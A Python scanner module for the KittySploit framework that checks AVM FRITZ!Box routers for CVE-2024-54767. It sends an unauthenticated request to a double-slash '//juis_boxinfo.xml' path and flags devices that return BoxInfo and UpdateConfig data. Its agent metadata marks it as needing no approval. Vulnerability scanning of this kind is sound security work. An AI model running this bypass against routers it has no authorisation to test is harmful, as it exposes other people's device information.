#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AVM FRITZ!Box unauthenticated juis_boxinfo.xml disclosure (CVE-2024-54767)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AVM FRITZ!Box - juis_boxinfo.xml Information Disclosure (CVE-2024-54767)',
        'description': (
            'AVM FRITZ!Box devices may expose //juis_boxinfo.xml without authentication, '
            'disclosing BoxInfo and UpdateConfig metadata (CVE-2024-54767).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'avm', 'fritzbox', 'router', 'iot',
            'exposure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Shuanunio/CVE_Requests/blob/main/AVM/fritz/AVM_FRITZ%21Box_7530%20AX_unauthorized_access_vulnerability_first.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-54767',
        ],
        'cve': 'CVE-2024-54767',
    }

    def run(self):
        # Double-slash path is intentional (auth bypass pattern from the advisory).
        path = '//juis_boxinfo.xml'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if 'BoxInfo>' in body and 'UpdateConfig>' in body:
            self.set_info(
                severity='high',
                reason='AVM FRITZ!Box CVE-2024-54767 juis_boxinfo.xml disclosure',
                path=path,
            )
            return True
        return False
